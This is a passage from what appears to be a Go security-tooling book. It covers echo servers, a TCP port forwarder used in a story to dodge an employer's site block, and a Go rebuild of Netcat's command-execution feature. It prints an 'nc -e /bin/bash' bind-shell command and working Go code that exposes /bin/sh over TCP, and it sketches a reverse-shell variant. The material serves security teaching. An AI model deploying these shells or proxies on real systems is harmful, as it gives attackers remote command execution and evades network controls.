    y writer.Flush()
}
No longer are you directly calling the Read([]byte) and Write([]byte) 
functions on the Conn instance; instead, you’re initializing a new buffered 
Reader and Writer via NewReader(io.Reader) u and NewWriter(io.Writer) w. These 
calls both take, as a parameter, an existing Reader and Writer (remember, 
the Conn type implements the necessary functions to be considered both 
a Reader and a Writer). 
Both buffered instances contain complementary functions for read-
ing and writing string data. ReadString(byte) v takes a delimiter character 
used to denote how far to read, whereas WriteString(byte) x writes the 
string to the socket. When writing data, you need to explicitly call writer 
.Flush() y to flush write all the data to the underlying writer (in this case, 
a Conn instance). 
Although the previous example simplifies the process by using buff-
ered I/O, you can reframe it to use the Copy(Writer, Reader) convenience 
function. Recall that this function takes as input a destination Writer and 
a source Reader, simply copying from source to destination. 
In this example, you’ll pass the conn variable as both the source and 
destination because you’ll be echoing the contents back on the established 
connection:
func echo(conn net.Conn) { 
    defer conn.Close() 
    // Copy data from io.Reader to io.Writer via io.Copy(). 
    if _, err := io.Copy(conn, conn); err != nil { 
        log.Fatalln("Unable to read/write data") 
    } 
} 
前沿信安资讯阵地  公众号：i nf osrc
TCP, Scanners, and Proxies   39
You’ve explored the basics of I/O and applied it to TCP servers. Now it’s 
time to move on to more usable, relevant examples. 
Proxying a TCP Client 
Now that you have a solid foundation, you can take what you’ve learned 
up to this point and create a simple port forwarder to proxy a connection 
through an intermediary service or host. As mentioned earlier in this 
chapter, this is useful for trying to circumvent restrictive egress controls 
or to leverage a system to bypass network segmentation. 
Before laying out the code, consider this imaginary but realistic prob-
lem: Joe is an underperforming employee who works for ACME Inc. as a 
business analyst making a handsome salary based on slight exaggerations 
he included on his resume. (Did he really go to an Ivy League school? Joe, 
that’s not very ethical.) Joe’s lack of motivation is matched only by his love 
for cats—so much so that Joe installed cat cameras at home and hosted a 
site, joescatcam.website, through which he could remotely monitor the dan-
der-filled fluff bags. One problem, though: ACME is onto Joe. They don’t 
like that he’s streaming his cat cam 24/7 in 4K ultra high-def, using valu-
able ACME network bandwidth. ACME has even blocked its employees from 
visiting Joe’s cat cam website. 
Joe has an idea. “What if I set up a port-forwarder on an internet- 
based system I control,” Joe says, “and force the redirection of all traffic 
from that host to joescatcam.website?” Joe checks at work the following day 
and confirms he can access his personal website, hosted at the joesproxy.com 
domain. Joe skips his afternoon meetings, heads to a coffee shop, and 
quickly codes a solution to his problem. He’ll forward all traffic received 
at http://joesproxy.com to http://joescatcam.website. 
Here’s Joe’s code, which he runs on the joesproxy.com server: 
func handle(src net.Conn) {
    dst, err := net.Dial("tcp", "joescatcam.website:80")u
    if err != nil {
        log.Fatalln("Unable to connect to our unreachable host")
    }
    defer dst.Close()
    // Run in goroutine to prevent io.Copy from blocking
    v go func() {
        // Copy our source's output to the destination
        if _, err := io.Copy(dst, src)w; err != nil {
            log.Fatalln(err)
        }
    }()
    // Copy our destination's output back to our source
    if _, err := io.Copy(src, dst)x; err != nil {
        log.Fatalln(err)
    }
}
前沿信安资讯阵地  公众号：i nf osrc
40   Chapter 2
func main() {
    // Listen on local port 80
    listener, err := net.Listen("tcp", ":80")
    if err != nil {
        log.Fatalln("Unable to bind to port")
    }
    for {
        conn, err := listener.Accept()
        if err != nil {
            log.Fatalln("Unable to accept connection")
        }
        go handle(conn)
    }
}
Start by examining Joe’s handle(net.Conn) function. Joe connects to 
joescatcam.website u (recall that this unreachable host isn’t directly accessible 
from Joe’s corporate workstation). Joe then uses Copy(Writer, Reader) two 
separate times. The first instance w ensures that data from the inbound 
connection is copied to the joescatcam.website connection. The second 
instance x ensures that data read from joescatcam.website is written back 
to the connecting client’s connection. Because Copy(Writer, Reader) is a 
blocking function, and will continue to block execution until the network 
connection is closed, Joe wisely wraps his first call to Copy(Writer, Reader) in 
a new goroutine v. This ensures that execution within the handle(net.Conn) 
function continues, and the second Copy(Writer, Reader) call can be made. 
Joe’s proxy listens on port 80 and relays any traffic received from 
a connection to and from port 80 on joescatcam.website. Joe, that crazy 
and wasteful man, confirms that he can connect to joescatcam.website via 
joesproxy.com by connecting with curl: 
$ curl -i -X GET http://joesproxy.com 
HTTP/1.1 200 OK 
Date: Wed, 25 Nov 2020 19:51:54 GMT 
Server: Apache/2.4.18 (Ubuntu) 
Last-Modified: Thu, 27 Jun 2019 15:30:43 GMT 
ETag: "6d-519594e7f2d25" 
Accept-Ranges: bytes 
Content-Length: 109 
Vary: Accept-Encoding 
Content-Type: text/html 
--snip--
At this point, Joe has done it. He’s living the dream, wasting ACME-
sponsored time and network bandwidth while he watches his cats. Today, 
there will be cats! 
Replicating Netcat for Command Execution 
In this section, let’s replicate some of Netcat’s more interesting functionality—
specifically, its gaping security hole. 
前沿信安资讯阵地  公众号：i nf osrc
TCP, Scanners, and Proxies   41
Netcat is the TCP/IP Swiss Army knife—essentially, a more flexible, 
scriptable version of Telnet. It contains a feature that allows stdin and 
stdout of any arbitrary program to be redirected over TCP, enabling an 
attacker to, for example, turn a single command execution vulnerability 
into operating system shell access. Consider the following:
$ nc –lp 13337 –e /bin/bash 
This command creates a listening server on port 13337. Any remote 
client that connects, perhaps via Telnet, would be able to execute arbitrary 
bash commands—hence the reason this is referred to as a gaping security 
hole. Netcat allows you to optionally include this feature during program 
compilation. (For good reason, most Netcat binaries you’ll find on standard 
Linux builds do not include this feature.) It’s dangerous enough that we’ll 
show you how to create it in Go!
First, look at Go’s os/exec package. You’ll use that for running oper-
ating system commands. This package defines a type, Cmd, that contains 
necessary methods and properties to run commands and manipulate stdin 
and stdout. You’ll redirect stdin (a Reader) and stdout (a Writer) to a Conn 
instance (which is both a Reader and a Writer). 
When you receive a new connection, you can use the Command(name 
string, arg ...string) function from os/exec to create a new Cmd instance. 
This function takes as parameters the operating system command and any 
arguments. In this example, hardcode /bin/sh as the command and pass -i 
as an argument such that you’re in interactive mode, which allows you to 
manipulate stdin and stdout more reliably: 
cmd := exec.Command("/bin/sh", "-i") 
This creates an instance of Cmd but doesn’t yet execute the command. 
You have a couple of options for manipulating stdin and stdout. You could 
use Copy(Writer, Reader) as discussed previously, or directly assign Reader and 
Writer to Cmd. Let’s directly assign your Conn object to both cmd.Stdin and 
cmd.Stdout, like so:
cmd.Stdin = conn 
cmd.Stdout = conn 
With the setup of the command and the streams complete, you run the 
command by using cmd.Run():
if err := cmd.Run(); err != nil { 
    // Handle error. 
} 
This logic works perfectly fine on Linux systems. However, when 
tweaking and running the program on a Windows system, running cmd.exe 
instead of /bin/bash, you’ll find that the connecting client never receives the 
前沿信安资讯阵地  公众号：i nf osrc
42   Chapter 2
command output because of some Windows-specific handling of anony-
mous pipes. Here are two solutions for this problem. 
First, you can tweak the code to explicitly force the flushing of stdout to 
correct this nuance. Instead of assigning Conn directly to cmd.Stdout, you imple-
ment a custom Writer that wraps bufio.Writer (a buffered writer) and explicitly 
calls its Flush method to force the buffer to be flushed. Refer to the “Creating 
the Echo Server” on page 35 for an exemplary use of bufio.Writer. 
Here’s the definition of the custom writer, Flusher:
// Flusher wraps bufio.Writer, explicitly flushing on all writes. 
type Flusher struct { 
    w *bufio.Writer 
} 
// NewFlusher creates a new Flusher from an io.Writer. 
func NewFlusher(w io.Writer) *Flusher { 
    return &Flusher{ 
        w: bufio.NewWriter(w), 
    } 
} 
// Write writes bytes and explicitly flushes buffer. 
u func (foo *Flusher) Write(b []byte) (int, error) { 
    count, err := foo.w.Write(b)v 
    if err != nil { 
        return -1, err 
    } 
    if err := foo.w.Flush()w; err != nil { 
        return -1, err 
    } 
    return count, err 
} 
The Flusher type implements a Write([]byte) function u that writes v 
the data to the underlying buffered writer and then flushes w the output. 
With the implementation of a custom writer, you can tweak the connec-
tion handler to instantiate and use this Flusher custom type for cmd.Stdout: 
func handle(conn net.Conn) { 
    // Explicitly calling /bin/sh and using -i for interactive mode 
    // so that we can use it for stdin and stdout. 
    // For Windows use exec.Command("cmd.exe"). 
    cmd := exec.Command("/bin/sh", "-i") 
    // Set stdin to our connection 
    cmd.Stdin = conn  
    // Create a Flusher from the connection to use for stdout. 
    // This ensures stdout is flushed adequately and sent via net.Conn.
    cmd.Stdout = NewFlusher(conn) 
    // Run the command. 
    if err := cmd.Run(); err != nil { 
前沿信安资讯阵地  公众号：i nf osrc
TCP, Scanners, and Proxies   43
        log.Fatalln(err) 
    } 
} 
This solution, while adequate, certainly isn’t elegant. Although working 
code is more important than elegant code, we’ll use this problem as 
an opportunity to introduce the io.Pipe() function, Go’s synchronous, 
in-memory pipe that can be used for connecting Readers and Writers: 
func Pipe() (*PipeReader, *PipeWriter) 
Using PipeReader and PipeWriter allows you to avoid having to explicitly 
flush the writer and synchronously connect stdout and the TCP connection. 
You will, yet again, rewrite the handler function: 
func handle(conn net.Conn) { 
    // Explicitly calling /bin/sh and using -i for interactive mode 
    // so that we can use it for stdin and stdout. 
    // For Windows use exec.Command("cmd.exe"). 
    cmd := exec.Command("/bin/sh", "-i") 
    // Set stdin to our connection 
    rp, wp := io.Pipe()u 
    cmd.Stdin = conn 
    v cmd.Stdout = wp 
    w go io.Copy(conn, rp) 
    cmd.Run() 
    conn.Close() 
} 
The call to io.Pipe() u creates both a reader and a writer that are 
synchronously connected—any data written to the writer (wp in this exam-
ple) will be read by the reader (rp). So, you assign the writer to cmd.Stdout v 
and then use io.Copy(conn, rp) w to link the PipeReader to the TCP con-
nection. You do this by using a goroutine to prevent the code from block-
ing. Any standard output from the command gets sent to the writer and 
then subsequently piped to the reader and out over the TCP connection. 
How’s that for elegant?
With that, you’ve successfully implemented Netcat’s gaping security 
hole from the perspective of a TCP listener awaiting a connection. You can 
use similar logic to implement the feature from the perspective of a con-
necting client redirecting stdout and stdin of a local binary to a remote 
listener. The precise details are left to you to determine, but would likely 
include the following: 
•
Establish a connection to a remote listener via net.Dial(network, 
address string). 
•
Initialize a Cmd via exec.Command(name string, arg ...string). 
•
Redirect Stdin and Stdout properties to utilize the net.Conn object. 
•
Run the command. 
前沿信安资讯阵地  公众号：i nf osrc
44   Chapter 2
At this point, the listener should receive a connection. Any data sent 
to the client should be interpreted as stdin on the client, and any data 
received on the listener should be interpreted as stdout. The full code of 
this example is available at https://github.com/blackhat-go/bhg/blob/master/ch-2 
/netcat-exec/main.go.
Summary
Now that you’ve explored practical applications and usage of Go as it 
relates to networking, I/O, and concurrency, let’s move on to creating 
usable HTTP clients.
前沿信安资讯阵地  公众号：i nf osrc
In Chapter 2, you learned how to harness 
the power of TCP with various techniques 
for creating usable clients and servers. This 
is the first in a series of chapters that explores a 
variety of protocols on higher layers of the OSI model. 
Because of its prevalence on networks, its affiliation 
with relaxed egress controls, and its general flexibility, 
let’s begin with HTTP. 
This chapter focuses on the client side. It will first introduce you to 
the basics of building and customizing HTTP requests and receiving their 
responses. Then you’ll learn how to parse structured response data so the 
client can interrogate the information to determine actionable or relevant 
data. Finally, you’ll learn how to apply these fundamentals by building HTTP 
clients that interact with a variety of security tools and resources. The clients  
you develop will query and consume the APIs of Shodan, Bing, and Metasploit 
and will search and parse document metadata in a manner similar to the 
metadata search tool FOCA.
3
H T T P  CL IE N T S A N D  
R E MO T E  IN T E R AC T ION 
W I T H T OOL S
前沿信安资讯阵地  公众号：i nf osrc
46   Chapter 3
HTTP Fundamentals with Go
Although you don’t need a comprehensive understanding of HTTP, you 
should know some fundamentals before you get started. 
First, HTTP is a stateless protocol: the server doesn’t inherently maintain 
state and status for each request. Instead, state is tracked through a variety 
of means, which may include session identifiers, cookies, HTTP headers, and 
more. The client and servers have a responsibility to properly negotiate and 
validate this state.
Second, communications between clients and servers can occur either 
synchronously or asynchronously, but they operate on a request/response 
cycle. You can include several options and headers in the request in order 
to influence the behavior of the server and to create usable web applica-
tions. Most commonly, servers host files that a web browser renders to pro-
duce a graphical, organized, and stylish representation of the data. But the 
endpoint can serve arbitrary data types. APIs commonly communicate via 
more structured data encoding, such as XML, JSON, or MSGRPC. In some 
cases, the data retrieved may be in binary format, representing an arbitrary 
file type for download.
Finally, Go contains convenience functions so you can quickly and eas-
ily build and send HTTP requests to a server and subsequently retrieve and 
process the response. Through some of the mechanisms you’ve learned in 
previous chapters, you’ll find that the conventions for handling structured 
data prove extremely convenient when interacting with HTTP APIs.
Calling HTTP APIs
Let’s begin the HTTP discussion by examining basic requests. Go’s net/http 
standard package contains several convenience functions to quickly and 
easily send POST, GET, and HEAD requests, which are arguably the most 
common HTTP verbs you’ll use. These functions take the following forms:
Get(url string) (resp *Response, err error) 
Head(url string) (resp *Response, err error) 